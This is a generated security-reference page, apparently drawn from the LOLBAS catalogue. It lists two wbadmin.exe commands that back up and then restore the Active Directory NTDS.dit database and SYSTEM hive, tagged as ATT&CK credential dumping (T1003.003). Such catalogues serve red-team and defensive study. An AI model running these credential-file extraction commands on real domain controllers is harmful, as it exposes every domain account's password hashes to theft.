---
parsed_by: focuslocust
source: commands
type: generated
---
# wbadmin Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## wbadmin.exe

Tool page: [wbadmin.exe](../../tools/windows/wbadmin.exe.md)

### Snapshoting of Active Directory NTDS.dit database

```text
wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
```

Description:

Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)

Related ATT&CK:

- [T1003.003](../../attack/techniques/T1003.003-ntds.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wbadmin.yml` |
| Evidence | Command preserved from source parser. |

### Dumping of Active Directory NTDS.dit database

```text
wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
```

Description:

Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers.

Related ATT&CK:

- [T1003.003](../../attack/techniques/T1003.003-ntds.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wbadmin.yml` |
| Evidence | Command preserved from source parser. |
